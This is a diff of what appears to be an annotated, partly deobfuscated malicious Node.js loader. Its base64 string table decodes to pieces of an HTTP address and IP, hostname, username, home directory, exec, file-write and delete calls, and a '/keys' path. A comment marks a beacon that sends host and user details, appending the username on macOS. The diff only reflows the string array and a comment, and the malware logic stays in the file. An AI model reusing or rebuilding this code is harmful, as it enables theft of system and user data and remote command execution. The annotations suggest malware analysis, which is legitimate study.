@@ -25,10 +25,60 @@ const aS = H; // aS → getStringByIndex (String accessor function)
  */
 function F() {
     const b5 = [
-        'MTc5MzM=', '704776XcIsUB', 'dXNlcm5hbWU', '4A1', 'cG9zdA', 'tcGF0aA', 'Ybm9kZTpwcm9', 'Z2V0', // "username", "post", "path", "node:pr", "get", "/s/", "cmp", "OTIu===="
-        'constructor', '6GIhNLI', '177330uvjtwe', 'L2tleXM', '/s/', 'cmp', 'OTIu====', 'split', // "cZm9ybURhdGE", "YcGxhdGZvcm0", "length", "join", "AcmVxdWVzdA", "bWtkaXJTeW5j", "d3JpdGVGaWxl", "RaG9tZWRpcg", "ZdXNlckluZm8", "now", "NDcuMTE4Mzgu", "ZT3", "sZXhlYw", "search", "fromCharCode", "2660600VygmMI", "bc7f301710f4", "810189YRoXjW", "from", "substring", "871972JtXaNK", "base64", "adXJs", "(((.+)+)+)+$", "LjEzNS4xOTUu", "slice", "54gVKMRW", "aaHR0cDovLw=", "toString", "EaG9zdG5hbWU", "68774xrQFIJ", "13xuwWYi", "cm1TeW5j", "126203qHmhCQ", "YXJndg", "11zmpQVh", "utf8", "jZXNz"
-        // Decoded: "username", "post", "path", "node:pr", "get", "/s/", "cmp", "OTIu===="
-        // "constructor", "6GIhNLI", "177330uvjtwe", "L2tleXM", "/s/", "cmp", "OTIu====", "split", "cZm9ybURhdGE", "YcGxhdGZvcm0", "length", "join", "AcmVxdWVzdA", "bWtkaXJTeW5j", "d3JpdGVGaWxl", "RaG9tZWRpcg", "ZdXNlckluZm8", "now", "NDcuMTE4Mzgu", "ZT3", "sZXhlYw", "search", "fromCharCode", "2660600VygmMI", "bc7f301710f4", "810189YRoXjW", "from", "substring", "871972JtXaNK", "base64", "adXJs", "(((.+)+)+)+$", "LjEz35.195.", "slice", "54gVKMRW", "http://", "toString", "hostname", "68774xrQFIJ", "13xuwWYi", "rmSync", "126203qHmhCQ", "argv", "11zmpQVh", "utf8", "js"
+        'MTc5MzM=',
+        '704776XcIsUB',
+        'dXNlcm5hbWU',
+        '4A1',
+        'cG9zdA',
+        'tcGF0aA',
+        'Ybm9kZTpwcm9',
+        'Z2V0',
+        'constructor',
+        '6GIhNLI',
+        '177330uvjtwe',
+        'L2tleXM',
+        '/s/',
+        'cmp',
+        'OTIu====',
+        'split',
+        'cZm9ybURhdGE',
+        'YcGxhdGZvcm0',
+        'length',
+        'join',
+        'AcmVxdWVzdA',
+        'bWtkaXJTeW5j',
+        'd3JpdGVGaWxl',
+        'RaG9tZWRpcg',
+        'ZdXNlckluZm8',
+        'now',
+        'NDcuMTE4Mzgu',
+        'ZT3',
+        'sZXhlYw',
+        'search',
+        'fromCharCode',
+        '2660600VygmMI',
+        'bc7f301710f4',
+        '810189YRoXjW',
+        'from',
+        'substring',
+        '871972JtXaNK',
+        'base64',
+        'adXJs',
+        '(((.+)+)+)+$',
+        'LjEzNS4xOTUu',
+        'slice',
+        '54gVKMRW',
+        'aaHR0cDovLw=',
+        'toString',
+        'EaG9zdG5hbWU',
+        '68774xrQFIJ',
+        '13xuwWYi',
+        'cm1TeW5j',
+        '126203qHmhCQ',
+        'YXJndg',
+        '11zmpQVh',
+        'utf8',
+        'jZXNz'
     ];
     F = function() {
         return b5;
@@ -351,7 +401,8 @@ const aw = async aD => {
 ax = async () => {
     const b2 = aS;
     av = hs, // av → hostname
-        'd' == pl[0x0] && (av = av + '+' + uin[a4(b2(0x16f))]); // If platform is "darwin", append username
+        'd' == pl[0x0] && (av = av + '+' + uin[a4(b2(0x16f))]); 
+        // If platform is "darwin", append username
     let aD = b2(0x170); // aD → beacon type "oqr"
     try {
         aD += zv[a4(b2(0x169))][0x1]; // Append vechain version info (suspicious)
